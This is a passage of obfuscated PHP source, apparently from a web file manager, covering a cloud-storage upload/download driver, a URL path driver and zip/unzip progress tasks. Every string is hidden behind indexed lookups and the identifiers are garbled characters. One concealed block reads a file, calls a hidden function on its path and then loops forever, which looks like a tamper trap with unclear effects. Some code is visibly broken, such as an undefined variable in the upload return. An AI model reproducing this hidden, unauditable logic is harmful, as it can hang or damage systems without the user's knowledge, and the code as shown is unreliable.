$üæ×´ÌÀ . $’ÃÊˆÁó[462] . $§Û’âŸñ); } $¯ÓÖ†ÕÑ = url_request($øòÑËı¸, $’ÃÊˆÁó[261], !1, $«Ø¶€Û); return $¯ÓÖ†ÕÑ[$’ÃÊˆÁó[823]] ? $¯ÓÖ†ÕÑ[$’ÃÊˆÁó[1287]] : !1; } public function upload($ä“£ÎŞ, $¨¬óâ«ù, $Àõ›ğäé = false, $úîˆÅı = REPEAT_REPLACE) { $Ú–¦ªîğ =& $_SERVER[¦»×‡Ãã]; $ùø«£ĞŞ = IO::size($¨¬óâ«ù); if ($ùø«£ĞŞ <= 1024 * 1024 * 200) { $ÑíÅÚ“ş = array($Ú–¦ªîğ[1577] . $¨¬óâ«ù); $ôŒ³ôâÑ = $this->ussRequest($ä“£ÎŞ, $Ú–¦ªîğ[259], $ÑíÅÚ“ş); return $ôŒ³ôâÑ[$Ú–¦ªîğ[1297]] ? $this->getPathOuter($ä“£ÎŞ) : !1; } $áà…»ÛÄ = 1024 * 1024 * 10; $ßŞŞ½£ê = array($Ú–¦ªîğ[1578], $Ú–¦ªîğ[1579] . $ùø«£ĞŞ, $Ú–¦ªîğ[1580], $Ú–¦ªîğ[1581] . $áà…»ÛÄ); $ôŒ³ôâÑ = $this->ussRequest($ä“£ÎŞ, $Ú–¦ªîğ[259], !1, $ßŞŞ½£ê); if (!$ôŒ³ôâÑ[$Ú–¦ªîğ[1297]]) { return !1; } $õĞîŒ× = $ôŒ³ôâÑ[$Ú–¦ªîğ[1287]]; $æŸ¬¸© = 0; $´ŒÎöø = $õĞîŒ×[$Ú–¦ªîğ[1582]]; $œ˜è„§¸ = fopen($¨¬óâ«ù, $Ú–¦ªîğ[1458]); if (!$œ˜è„§¸) { return !1; } do { $É·‰ÔÙ = $õĞîŒ×[$Ú–¦ªîğ[1583]]; fseek_64($œ˜è„§¸, $æŸ¬¸©); $“‚üÂ­‰ = fread($œ˜è„§¸, $É·‰ÔÙ); $ñ§—ÆÖ = 0; do { $ñ§—ÆÖ++; $õĞîŒ× = $this->uploadPart($ä“£ÎŞ, $õĞîŒ×, $“‚üÂ­‰); } while (!$õĞîŒ× && $ñ§—ÆÖ < 3); if (!$õĞîŒ×) { return !1; } $´ŒÎöø = $õĞîŒ×[$Ú–¦ªîğ[1582]]; $æŸ¬¸© += $É·‰ÔÙ; } while ($´ŒÎöø != -1); fclose($œ˜è„§¸); $ßŞŞ½£ê = array($Ú–¦ªîğ[1584], $Ú–¦ªîğ[1585] . $õĞîŒ×[$Ú–¦ªîğ[1586]], $Ú–¦ªîğ[1580]); $ôŒ³ôâÑ = $this->ussRequest($ä“£ÎŞ, $Ú–¦ªîğ[259], !1, $ßŞŞ½£ê); return $ôŒ³ôâÑ[$Ú–¦ªîğ[1297]] ? $this->getPathOuter($Õ¤—¤í) : !1; } private function uploadPart($í«Ó—é×, $ìù¿˜, &$ÌÇ€Ğß) { $œ€ïï’ø =& $_SERVER[¦»×‡Ãã]; $–„Ë¹×ø = array($œ€ïï’ø[1587], $œ€ïï’ø[1585] . $ìù¿˜[$œ€ïï’ø[1586]], $œ€ïï’ø[1588] . $ìù¿˜[$œ€ïï’ø[1582]], $œ€ïï’ø[146] . $ìù¿˜[$œ€ïï’ø[1583]]); $¸¾…ÑŸ¼ = $this->ussRequest($í«Ó—é×, $œ€ïï’ø[259], $ÌÇ€Ğß, $–„Ë¹×ø); return !$¸¾…ÑŸ¼[$œ€ïï’ø[1297]] ? $¸¾…ÑŸ¼[$œ€ïï’ø[1297]] : $¸¾…ÑŸ¼[$œ€ïï’ø[1287]]; } public function uploadFormData($ÄÁ’İ·æ, $óşæ¬‘¶ = 3600) { return $this->uploadPolicy($ÄÁ’İ·æ, $óşæ¬‘¶); } public function multiUploadFormData($éÑ”¼, $¯©èÇÌÉ = 3600) { $Áı«Âçô =& $_SERVER[¦»×‡Ãã]; $£Û•êæÓ = (int) $GLOBALS[$Áı«Âçô[7]][$Áı«Âçô[79]]; return $this->uploadPolicy($éÑ”¼, $¯©èÇÌÉ, $£Û•êæÓ); } private function uploadPolicy($²à’Ù‘ñ, $ƒ¤Â˜ó© = 3600, $İ˜ÆšÅû = 0) { $ŞßãÄ„Ğ =& $_SERVER[¦»×‡Ãã]; $Ú›°Ï˜ƒ = $ŞßãÄ„Ğ[8] . $this->bucket; $öŒÖ™ãÙ = gmdate($ŞßãÄ„Ğ[1493]); $ÏĞÅì— = array($ŞßãÄ„Ğ[1589] => $this->bucket, $ŞßãÄ„Ğ[1590] => $²à’Ù‘ñ, $ŞßãÄ„Ğ[1591] => time() + $ƒ¤Â˜ó©, $ŞßãÄ„Ğ[1592] => $öŒÖ™ãÙ); if ($İ˜ÆšÅû) { $ÏĞÅì—[$ŞßãÄ„Ğ[1478]] = $İ˜ÆšÅû; } $³¾¨şÊú = base64_encode(json_encode($ÏĞÅì—)); $­ÚªÊßó = base64_encode(hash_hmac($ŞßãÄ„Ğ[1546], "\x50\117\123\x54\x26{$Ú›°Ï˜ƒ}\46{$öŒÖ™ãÙ}\46{$³¾¨şÊú}", md5("{$this->userpass}"), !0)); $ÂùßÕŞÍ = array($ŞßãÄ„Ğ[293] => $³¾¨şÊú, $ŞßãÄ„Ğ[1593] => "\125\x50\x59\125\x4e\40{$this->username}\x3a{$­ÚªÊßó}", $ŞßãÄ„Ğ[208] => $this->endpoint . $Ú›°Ï˜ƒ); return $ÂùßÕŞÍ; } public function download($¥ªæàÂ, $…åùŒ) { $”¤ƒãû = IO::getPathInner(IO::mkfile($…åùŒ)); if (!($Òü÷’Âü = $this->link($¥ªæàÂ))) { return !1; } $×ıôÛ£å = 0; $¸¶š¤ = 1024 * 200; $“¥èÁ÷¥ = fopen($”¤ƒãû, $_SERVER[¦»×‡Ãã][1541]); while (!0) { $øÁùš‘å = $this->fileSubstr($¥ªæàÂ, $×ıôÛ£å, $¸¶š¤); if ($øÁùš‘å === !1) { return !1; } fwrite($“¥èÁ÷¥, $øÁùš‘å); $×ıôÛ£å += $¸¶š¤; if (strlen($øÁùš‘å) < $¸¶š¤) { break; } } fclose($“¥èÁ÷¥); return $…åùŒ; } public function link($àö‹ˆŸÍ, $«ÑÎ§¾… = array()) { $êºË´ºÆ =& $_SERVER[¦»×‡Ãã]; $àö‹ˆŸÍ = trim($àö‹ˆŸÍ, $êºË´ºÆ[8]); if (!empty($this->token)) { $³»‰ÅƒÖ = strtotime(date($êºË´ºÆ[1594])); $¦è¹èÉ¹ = substr(md5($this->token . $êºË´ºÆ[360] . $³»‰ÅƒÖ . $êºË´ºÆ[1595] . $àö‹ˆŸÍ), 12, 8) . $³»‰ÅƒÖ; $«ÑÎ§¾…[] = $êºË´ºÆ[1596] . $¦è¹èÉ¹; } $´ÙÃüÔÓ = !empty($«ÑÎ§¾…) ? $êºË´ºÆ[76] . implode($êºË´ºÆ[360], $«ÑÎ§¾…) : $êºË´ºÆ[12]; return $this->getHost() . $êºË´ºÆ[8] . $àö‹ˆŸÍ . $´ÙÃüÔÓ; } public function fileOut($²¾Üíã, $İóù”ñ = false, $Ô‹©¨Æõ = false, $œ®Èáü× = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($²¾Üíã, $İóù”ñ, $Ô‹©¨Æõ, $œ®Èáü×); } if (!$Ô‹©¨Æõ) { $Ô‹©¨Æõ = $this->pathThis($²¾Üíã); } $›È³åí² = $İóù”ñ ? array($_SERVER[¦»×‡Ãã][1597] . rawurlencode($Ô‹©¨Æõ)) : array(); $û•°ğ™ = $this->link($²¾Üíã, $›È³åí²); $this->fileOutLink($û•°ğ™); } public function fileOutServer($Â¬´Áœï, $õÒù÷ò¸ = false, $‘ŸÏĞÔ• = false, $ê¶Ì²· = '') { parent::fileOut($Â¬´Áœï, $õÒù÷ò¸, $‘ŸÏĞÔ•, $ê¶Ì²·); } public function fileOutImage($Í©…û“, $ÛÑ£Õ¬ = 250) { $Ü”öä = $this->link($Í©…û“ . $_SERVER[¦»×‡Ãã][1598] . $ÛÑ£Õ¬); $this->fileOutLink($Ü”öä); } public function fileOutImageServer($¤ù µÚ½, $“âîÂñå = 250) { parent::fileOutImage($¤ù µÚ½, $“âîÂñå); } public function hashMd5($œÒÚ”¶) { $óä‰Ë¯£ =& $_SERVER[¦»×‡Ãã]; $©†”¿Ã = $this->_objectMeta($œÒÚ”¶); return isset($©†”¿Ã[$óä‰Ë¯£[245]]) ? $©†”¿Ã[$óä‰Ë¯£[245]] : !1; } public function size($”‹š”Ãó) { $²Å‚ì¿Ô = $this->objectMeta($”‹š”Ãó); return $²Å‚ì¿Ô ? $²Å‚ì¿Ô[$_SERVER[¦»×‡Ãã][79]] : 0; } public function info($“à¨Í­) { if ($this->isFolder($“à¨Í­)) { return $this->folderInfo($“à¨Í­); } else { if ($this->isFile($“à¨Í­)) { return $this->fileInfo($“à¨Í­); } } return !1; } public function exist($î²ªÙ²Ü) { return $this->isFile($î²ªÙ²Ü) || $this->isFolder($î²ªÙ²Ü); } public function isFile($Æ»¾±©–) { return !$this->isFolder($Æ»¾±©–) && $this->objectMeta($Æ»¾±©–); } public function isFolder($£ò±ÈŠö) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][179], $£ò±ÈŠö); } protected function objectMeta($Ê Ä–¸Í) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][181], $Ê Ä–¸Í); } protected function _objectMeta($ˆú‚×¼Î) { $‘ø”¥££ =& $_SERVER[¦»×‡Ãã]; if ($ˆú‚×¼Î == $‘ø”¥££[12] || $ˆú‚×¼Î == $‘ø”¥££[8]) { return array(); } $ßŞûõ = $this->ussRequest($ˆú‚×¼Î, $‘ø”¥££[1599]); if (!$ßŞûõ[$‘ø”¥££[1297]]) { return null; } $òÑ®Á§ó = isset($ßŞûõ[$‘ø”¥££[1287]]) ? $ßŞûõ[$‘ø”¥££[1287]] : array(); if (!isset($òÑ®Á§ó[$‘ø”¥££[1600]])) { return null; } $´âàúòÑ = array($‘ø”¥££[33] => isset($òÑ®Á§ó[$‘ø”¥££[1600]]) ? $òÑ®Á§ó[$‘ø”¥££[1600]] : null, $‘ø”¥££[79] => isset($òÑ®Á§ó[$‘ø”¥££[1601]]) ? $òÑ®Á§ó[$‘ø”¥££[1601]] : null, $‘ø”¥££[245] => isset($òÑ®Á§ó[$‘ø”¥££[1602]]) ? $òÑ®Á§ó[$‘ø”¥££[1602]] : null, $‘ø”¥££[1569] => isset($òÑ®Á§ó[$‘ø”¥££[1603]]) ? $òÑ®Á§ó[$‘ø”¥££[1603]] : null); $´âàúòÑ[$‘ø”¥££[1570]] = isset($òÑ®Á§ó[$‘ø”¥££[1604]]) ? strtotime($òÑ®Á§ó[$‘ø”¥££[1604]]) : $´âàúòÑ[$‘ø”¥££[1569]]; return $´âàúòÑ; } protected function _isFolder($ëÊÙŠßÀ) { $‡«Àê° =& $_SERVER[¦»×‡Ãã]; if ($ëÊÙŠßÀ == $‡«Àê°[12] || $ëÊÙŠßÀ == $‡«Àê°[8]) { return !0; } $îêõ²” = $this->_objectMeta($ëÊÙŠßÀ); return isset($îêõ²”[$‡«Àê°[33]]) && $îêõ²”[$‡«Àê°[33]] == $‡«Àê°[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÑÇóÉƒ· = false) { } public function exist($Ú¢­øùÑ) { $§ıáüã = $this->info($Ú¢­øùÑ); return $§ıáüã[$_SERVER[¦»×‡Ãã][232]]; } public function isFile($æ¯×¡ø®) { $öİœ–½ = $this->info($æ¯×¡ø®); return $öİœ–½[$_SERVER[¦»×‡Ãã][232]]; } public function isFolder($úòÜ“Å¿) { return !1; } public function size($Ìó¬‚¤É) { $ğ¶Œ–‹‰ = $this->info($Ìó¬‚¤É); return $ğ¶Œ–‹‰[$_SERVER[¦»×‡Ãã][79]]; } public function info($®ñÙÄ»‡) { return $this->infoParse($®ñÙÄ»‡); } public function infoAuth($»Ñúºœ) { return $this->infoParse($»Ñúºœ); } public function infoWithChildren($ÓñõÁ·) { return $this->infoParse($ÓñõÁ·); } public function infoFull($îúÈìª“) { return $this->infoParse($îúÈìª“); } private function infoParse($“àæ¸ûÜ) { $×ÆŸ®åº =& $_SERVER[¦»×‡Ãã]; $±ÈŞÂ’ = $this->header($“àæ¸ûÜ); if (!$±ÈŞÂ’ || !$±ÈŞÂ’[$×ÆŸ®åº[823]]) { return !1; } $ƒÇ¯¿æ¶ = _get($±ÈŞÂ’, $×ÆŸ®åº[413], 0); $’©ÊÜÁø = array($×ÆŸ®åº[32] => $±ÈŞÂ’[$×ÆŸ®åº[32]], $×ÆŸ®åº[87] => $“àæ¸ûÜ, $×ÆŸ®åº[33] => $×ÆŸ®åº[230], $×ÆŸ®åº[79] => intval($ƒÇ¯¿æ¶), $×ÆŸ®åº[169] => get_path_ext($±ÈŞÂ’[$×ÆŸ®åº[32]]), $×ÆŸ®åº[1455] => $ƒÇ¯¿æ¶ > 0 && $±ÈŞÂ’[$×ÆŸ®åº[1605]], $×ÆŸ®åº[1456] => !1); return $’©ÊÜÁø; } private function header($ê«‰ì·°) { $  Ûê¬ä =& $_SERVER[¦»×‡Ãã]; if (isset(self::$_cacheHeader[$ê«‰ì·°])) { return self::$_cacheHeader[$ê«‰ì·°]; } $¶°øÌÆå = isset($GLOBALS[$  Ûê¬ä[1606]]) ? $GLOBALS[$  Ûê¬ä[1606]] : !1; $GLOBALS[$  Ûê¬ä[1606]] = !0; self::$_cacheHeader[$ê«‰ì·°] = url_header($ê«‰ì·°); $GLOBALS[$  Ûê¬ä[1606]] = $¶°øÌÆå; return self::$_cacheHeader[$ê«‰ì·°]; } public function hashSimple($Ó“¨êò«, $—¡™åÒÓ = false) { $à¶ÒøÃ =& $_SERVER[¦»×‡Ãã]; $¾Ğñˆüç = $this->info($Ó“¨êò«); if (!$¾Ğñˆüç || !$¾Ğñˆüç[$à¶ÒøÃ[232]]) { return !1; } $Øå¾ì¡— = $¾Ğñˆüç[$à¶ÒøÃ[79]]; $ØœÔõ˜ = 200; $‹ÍÑÇÖ™ = 50; if ($Øå¾ì¡— <= $ØœÔõ˜ * $‹ÍÑÇÖ™) { return md5($this->fileSubstr($Ó“¨êò«, 0, $Øå¾ì¡—)) . $Øå¾ì¡—; } $‹ÏÔ‰Ü« = intval($Øå¾ì¡— / $‹ÍÑÇÖ™); $¶±šÉé = $à¶ÒøÃ[12]; $Ïª‘½ºÙ = timeFloat(); $µµŸãú = 15; for ($¤†¸¤ùÂ = 0; $¤†¸¤ùÂ < $‹ÍÑÇÖ™; $¤†¸¤ùÂ++) { if (timeFloat() - $Ïª‘½ºÙ > $µµŸãú) { return !1; } $şşù‚¬ğ = $this->fileSubstr($Ó“¨êò«, $‹ÏÔ‰Ü« * $¤†¸¤ùÂ, $ØœÔõ˜); if (!$şşù‚¬ğ) { return !1; } $¶±šÉé .= $şşù‚¬ğ; } $¶±šÉé .= $this->fileSubstr($Ó“¨êò«, $Øå¾ì¡— - $ØœÔõ˜, $ØœÔõ˜); return md5($¶±šÉé) . $Øå¾ì¡—; } public function getContent($À àñ™ô) { return $this->fileSubstr($À àñ™ô); } public function fileSubstr($ŞÁËûÏ, $•¬Ï«­º = 0, $õ ßÊÑß = -1) { $µºùïô =& $_SERVER[¦»×‡Ãã]; $¹Ãóº™ = $this->info($ŞÁËûÏ); if (!$¹Ãóº™ || !$¹Ãóº™[$µºùïô[232]] && $¹Ãóº™[$µºùïô[79]] > 1024 * 1024 * 10) { return !1; } if ($õ ßÊÑß === -1) { $õ ßÊÑß = $¹Ãóº™[$µºùïô[79]]; } if ($õ ßÊÑß == 0) { return $µºùïô[12]; } $Üšû¶ë = array($µºùïô[1607] . $•¬Ï«­º . $µºùïô[858] . ($•¬Ï«­º + $õ ßÊÑß - 1)); $à¬š…Îú = url_request($ŞÁËûÏ, $µºùïô[261], !1, $Üšû¶ë, !1, !1, 30); return $à¬š…Îú[$µºùïô[1287]] ? $à¬š…Îú[$µºùïô[1287]] : $µºùïô[12]; } public function download($ÛÊŒÚšï, $Áõ°ñ) { Downloader::start($ÛÊŒÚšï, $Áõ°ñ); return $Áõ°ñ; } } if (!isset($_SERVER[$_SERVER[¦»×‡Ãã][952]]) || !isset($_SERVER[$_SERVER[¦»×‡Ãã][1418]])) { $_getc = $_SERVER[¦»×‡Ãã][954]; $_getfile = $_SERVER[$_SERVER[¦»×‡Ãã][949]] . $_SERVER[¦»×‡Ãã][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¦»×‡Ãã][262], $_getfilec); if (count($_getarrs) < $_SERVER[¦»×‡Ãã][690]) { $exit = $_SERVER[¦»×‡Ãã][955]; $exit(); } $_act = $_SERVER[¦»×‡Ãã][1419]; $_act($_SERVER[$_SERVER[¦»×‡Ãã][949]] . $_SERVER[¦»×‡Ãã][950]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¦»×‡Ãã][454]); } } goto dÖ‚Øİá³; EîŸùî‹‡õ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ùö÷å‡± =& $_SERVER[¦»×‡Ãã]; parent::startAfter(); Hook::bind($Ùö÷å‡±[1885], array($this, $Ùö÷å‡±[1886])); Hook::bind($Ùö÷å‡±[1278], array($this, $Ùö÷å‡±[1887])); Hook::bind($Ùö÷å‡±[1888], array($this, $Ùö÷å‡±[1889])); $¿¯’çõ™ =& $this->task; $¿¯’çõ™[$Ùö÷å‡±[1890]] = $Ùö÷å‡±[1279]; if (!$¿¯’çõ™[$Ùö÷å‡±[1661]]) { $¿¯’çõ™[$Ùö÷å‡±[1661]] = LNG($Ùö÷å‡±[1891]); } } protected function endAfter() { $°º©Œ·¾ =& $_SERVER[¦»×‡Ãã]; parent::endAfter(); Hook::unbind($°º©Œ·¾[1885], array($this, $°º©Œ·¾[1886])); Hook::unbind($°º©Œ·¾[1278], array($this, $°º©Œ·¾[1887])); Hook::unbind($°º©Œ·¾[1888], array($this, $°º©Œ·¾[1889])); } public function updateAfter() { $‚ âÈ‘Ò =& $_SERVER[¦»×‡Ãã]; $ÁÁàÔó¼ =& $this->task; if (!$ÁÁàÔó¼[$‚ âÈ‘Ò[1141]] || !$ÁÁàÔó¼[$‚ âÈ‘Ò[836]]) { if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1890]] != $‚ âÈ‘Ò[389]) { return; } } if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1890]] == $‚ âÈ‘Ò[1279]) { $ÈïğŸÏ— = 0; if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1825]]) { $ÈïğŸÏ— = $ÁÁàÔó¼[$‚ âÈ‘Ò[1826]] / $ÁÁàÔó¼[$‚ âÈ‘Ò[1825]]; } $ÁÁàÔó¼[$‚ âÈ‘Ò[1774]] = $ÈïğŸÏ— * 0.3; } else { if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1890]] == $‚ âÈ‘Ò[389]) { $ÈïğŸÏ— = $ÁÁàÔó¼[$‚ âÈ‘Ò[1773]] / $ÁÁàÔó¼[$‚ âÈ‘Ò[1141]]; $ÁÁàÔó¼[$‚ âÈ‘Ò[1774]] = 0.3 + $ÈïğŸÏ— * 0.4; } else { if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1890]] == $‚ âÈ‘Ò[110]) { $ÔæÁùÆŒ = 0; if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1827]] == $‚ âÈ‘Ò[110]) { $ÔæÁùÆŒ = $ÁÁàÔó¼[$‚ âÈ‘Ò[1826]]; } $ÈïğŸÏ— = ($ÁÁàÔó¼[$‚ âÈ‘Ò[1830]] + $ÔæÁùÆŒ) / $ÁÁàÔó¼[$‚ âÈ‘Ò[836]]; $ÁÁàÔó¼[$‚ âÈ‘Ò[1774]] = 0.3 + 0.4 + $ÈïğŸÏ— * 0.3; } } } if ($ÁÁàÔó¼[$‚ âÈ‘Ò[1774]] > 0) { $µÍŒÂ¶ = timeFloat() - $ÁÁàÔó¼[$‚ âÈ‘Ò[1776]] - $ÁÁàÔó¼[$‚ âÈ‘Ò[1779]]; $ÁÁàÔó¼[$‚ âÈ‘Ò[1780]] = $µÍŒÂ¶ * (1 - $ÁÁàÔó¼[$‚ âÈ‘Ò[1774]]) / $ÁÁàÔó¼[$‚ âÈ‘Ò[1774]]; } } public function addFile($âæ ‘ˆ—) { $œÙ§¸ÀŞ =& $_SERVER[¦»×‡Ãã]; $¦å‚º¶³ =& $this->task; $´ˆ¬Ûôï = IO::info($âæ ‘ˆ—); $¦å‚º¶³[$œÙ§¸ÀŞ[1823]] = $´ˆ¬Ûôï[$œÙ§¸ÀŞ[32]]; $¦å‚º¶³[$œÙ§¸ÀŞ[1825]] = $´ˆ¬Ûôï[$œÙ§¸ÀŞ[79]]; $¦å‚º¶³[$œÙ§¸ÀŞ[1826]] = 0; $¦å‚º¶³[$œÙ§¸ÀŞ[1143]] = $œÙ§¸ÀŞ[1846]; $¦å‚º¶³[$œÙ§¸ÀŞ[1827]] = $œÙ§¸ÀŞ[1279]; $¦å‚º¶³[$œÙ§¸ÀŞ[836]] = $´ˆ¬Ûôï[$œÙ§¸ÀŞ[79]]; $¦å‚º¶³[$œÙ§¸ÀŞ[1141]] = 1; $Ú¶ôÑÁı = 0; $¦å‚º¶³[$œÙ§¸ÀŞ[1834]] = array($œÙ§¸ÀŞ[1835] => $Ú¶ôÑÁı + 1, $œÙ§¸ÀŞ[494] => $´ˆ¬Ûôï[$œÙ§¸ÀŞ[32]], $œÙ§¸ÀŞ[87] => $´ˆ¬Ûôï[$œÙ§¸ÀŞ[87]], $œÙ§¸ÀŞ[582] => $´ˆ¬Ûôï[$œÙ§¸ÀŞ[582]] ? $´ˆ¬Ûôï[$œÙ§¸ÀŞ[582]] : $´ˆ¬Ûôï[$œÙ§¸ÀŞ[87]]); $this->update(); } public function zipEvent($ˆì ®âÈ, $ú¬–ï¼, $ı¥ô´¹µ, $ÖÃ¼‰÷) { $½§íÍ©“ =& $_SERVER[¦»×‡Ãã]; $ÕßØö§ù =& $this->task; $ÕßØö§ù[$½§íÍ©“[1823]] = get_path_this($ú¬–ï¼); $ÕßØö§ù[$½§íÍ©“[1825]] = $ÖÃ¼‰÷; $ÕßØö§ù[$½§íÍ©“[1826]] = $ı¥ô´¹µ; $ÕßØö§ù[$½§íÍ©“[1143]] = $ˆì ®âÈ == $½§íÍ©“[1892] ? $½§íÍ©“[1893] : $½§íÍ©“[1894]; $ÕßØö§ù[$½§íÍ©“[1827]] = $½§íÍ©“[12]; $ÕßØö§ù[$½§íÍ©“[836]] = $ÖÃ¼‰÷; $ÕßØö§ù[$½§íÍ©“[1890]] = $½§íÍ©“[389]; $this->update(); } public function unzipAfter($Õ®„àÈ¢) { $•Ô‹ˆÏ› =& $_SERVER[¦»×‡Ãã]; $³õ¤êûÍ =& $this->task; $³õ¤êûÍ[$•Ô‹ˆÏ›[1890]] = $•Ô‹ˆÏ›[110]; $£È°Ï•Ì = IO::infoWithChildren($Õ®„àÈ¢); $Ÿ×ÊšŠ = 0; $³õ¤êûÍ[$•Ô‹ˆÏ›[1834]] = array($•Ô‹ˆÏ›[1835] => $Ÿ×ÊšŠ + 1, $•Ô‹ˆÏ›[494] => $£È°Ï•Ì[$•Ô‹ˆÏ›[32]], $•Ô‹ˆÏ›[87] => $£È°Ï•Ì[$•Ô‹ˆÏ›[87]], $•Ô‹ˆÏ›[582] => $£È°Ï•Ì[$•Ô‹ˆÏ›[582]] ? $£È°Ï•Ì[$•Ô‹ˆÏ›[582]] : $£È°Ï•Ì[$•Ô‹ˆÏ›[87]]); if ($£È°Ï•Ì[$•Ô‹ˆÏ›[33]] == $•Ô‹ˆÏ›[230]) { $³õ¤êûÍ[$•Ô‹ˆÏ›[1141]] = 1; } else { $³õ¤êûÍ[$•Ô‹ˆÏ›[1141]] = $£È°Ï•Ì[$•Ô‹ˆÏ›[82]][$•Ô‹ˆÏ›[80]]; } $³õ¤êûÍ[$•Ô‹ˆÏ›[1143]] = $•Ô‹ˆÏ›[12]; $³õ¤êûÍ[$•Ô‹ˆÏ›[1827]] = 0; $³õ¤êûÍ[$•Ô‹ˆÏ›[1773]] = 0; $³õ¤êûÍ[$•Ô‹ˆÏ›[1825]] = 0; $³õ¤êûÍ[$•Ô‹ˆÏ›[1826]] = 0; $³õ¤êûÍ[$•Ô‹ˆÏ›[1823]] = $•Ô‹ˆÏ›[12]; $³õ¤êûÍ[$•Ô‹ˆÏ›[1830]] = 0; $³õ¤êûÍ[$•Ô‹ˆÏ›[836]] = $£È°Ï•Ì[$•Ô‹ˆÏ›[79]]; $this->update(); self::log($•Ô‹ˆÏ›[1895] . json_encode(array($³õ¤êûÍ, $£È°Ï•Ì))); } public function nameParse($¿õ›‡•) { $ôù«œ¸² =& $_SERVER[¦»×‡Ãã]; $ÀÈı®Ü¾ =& $this->task; if ($ÀÈı®Ü¾[$ôù«œ¸²[1890]] == $ôù«œ¸²[1279]) { $ÀÈı®Ü¾[$ôù«œ¸²[1890]] = $ôù«œ¸²[389]; $ÀÈı®Ü¾[$ôù«œ¸²[1830]] = 0; $ÀÈı®Ü¾[$ôù«œ¸²[836]] = 0; } $â“éº§Ş = get_path_this($¿õ›‡•); if (strstr($â“éº§Ş, $ôù«œ¸²[10])) { $ÀÈı®Ü¾[$ôù«œ¸²[1773]] += 1; $ÀÈı®Ü¾[$ôù«œ¸²[1141]] += 1; } $ÀÈı®Ü¾[$ôù«œ¸²[1823]] = $¿õ›‡•; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $œ¸Ù¬’ =& $_SERVER[¦»×‡Ãã]; parent::startAfter(); Hook::bind($œ¸Ù¬’[1896], array($this, $œ¸Ù¬’[1886])); Hook::bind($œ¸Ù¬’[1888], array($this, $œ¸Ù¬’[1889])); $ª§øÙ =& $this->task; $ª§øÙ[$œ¸Ù¬’[1890]] = $œ¸Ù¬’[1279]; if (!$ª§øÙ[$œ¸Ù¬’[1661]]) { $ª§øÙ[$œ¸Ù¬’[1661]] = LNG($œ¸Ù¬’[1897]); } } protected function endAfter() { $Êƒ¹À§ =& $_SERVER[¦»×‡Ãã]; parent::endAfter(); Hook::unbind($Êƒ¹À§[1896], array($this, $Êƒ¹À§[1886])); Hook::unbind($Êƒ¹À§[1888], array($this, $Êƒ¹À§[1889])); } public function updateAfter() { $ù…İ· ¥ =& $_SERVER[¦»×‡Ãã]; $Œ«‡âüÑ =& $this->task; if (!$Œ«‡âüÑ[$ù…İ· ¥[1141]] || !$Œ«‡âüÑ[$ù…İ· ¥[836]]) { return; } if ($Œ«‡âüÑ[$ù…İ· ¥[1890]] == $ù…İ· ¥[1279]) { $”ˆ‰¨Œ = $Œ«‡âüÑ[$ù…İ· ¥[1826]]; if ($Œ«‡âüÑ[$ù…İ· ¥[1827]] != $ù…İ· ¥[1279]) { $”ˆ‰¨Œ = 0; } $ü€Èïîö = ($Œ«‡âüÑ[$ù…İ· ¥[1830]] + $”ˆ‰¨Œ) / $Œ«‡âüÑ[$ù…İ· ¥[836]]; $Œ«‡âüÑ[$ù…İ· ¥[1774]] = $ü€Èïîö * 0.3; } else { if ($Œ«‡âüÑ[$ù…İ· ¥[1890]] == $ù…İ· ¥[389]) { $ü€Èïîö = $Œ«‡âüÑ[$ù…İ· ¥[1773]] / $Œ«‡âüÑ[$ù…İ· ¥[1141]]; $Œ«‡âüÑ[$ù…İ· ¥[1774]] = 0.3 + $ü€Èïîö * 0.5; } else { if ($Œ«‡âüÑ[$ù…İ· ¥[1890]] == $ù…İ· ¥[110]) { $ü€Èïîö = 0; if ($Œ«‡âüÑ[$ù…İ· ¥[1825]]) { $ü€Èïîö = $Œ«‡âüÑ[$ù…İ· ¥[1826]] / $Œ«‡âüÑ[$ù…İ· ¥[1825]]; } $Œ«‡âüÑ[$ù…İ· ¥[1774]] = 0.3 + 0.5 + $ü€Èïîö * 0.2; } } } if ($Œ«‡âüÑ[$ù…İ· ¥[1774]] > 0) { $»¤Ùé = timeFloat() - $Œ«‡âüÑ[$ù…İ· ¥[1776]] - $Œ«‡âüÑ[$ù…İ· ¥[1779]]; $Œ«‡âüÑ[$ù…İ· ¥[1780]] = $»¤Ùé * (1 - $Œ«‡âüÑ[$ù…İ· ¥[1774]]) / $Œ«‡âüÑ[$ù…İ· ¥[1774]]; } } public function copyFileStart($ãÛÜŒê©, $ŒñæÑ, $å³ûõÎŠ, $´ááúÁ, $Åñ­ÜĞ°, $¼ÊÖÑ‡Ó) { $ôˆ‡ëæ¥ =& $_SERVER[¦»×‡Ãã]; parent::copyFileStart($ãÛÜŒê©, $ŒñæÑ, $å³ûõÎŠ, $´ááúÁ, $Åñ­ÜĞ°, $¼ÊÖÑ‡Ó); $«ÌÙüŸª =& $this->task; if ($«ÌÙüŸª[$ôˆ‡ëæ¥[1890]] == $ôˆ‡ëæ¥[389]) { $«ÌÙüŸª[$ôˆ‡ëæ¥[1890]] = $ôˆ‡ëæ¥[110]; } $this->update(); } public function copyFileEnd($µæÚ¿†, $ƒ•³í·Ì, $¶ßòó„ú, $®ê°»Æ, $ºûÆëÍ, $’†ëÌ–µ) { $™òìˆ¬­ =& $_SERVER[¦»×‡Ãã]; $ô„ÀÒ–ô =& $this->task; $ô„ÀÒ–ô[$™òìˆ¬­[1826]] = $ô„ÀÒ–ô[$™òìˆ¬­[1825]]; $ô„ÀÒ–ô[$™òìˆ¬­[1830]] += $ô„ÀÒ–ô[$™òìˆ¬­[1825]]; $ô„ÀÒ–ô[$™òìˆ¬­[1827]] = $™òìˆ¬­[12]; $this->update(); } public function zipEvent($óûÊúÁ, $îĞœçŠ, $ùé´ë€, $Ÿ²ãó) { 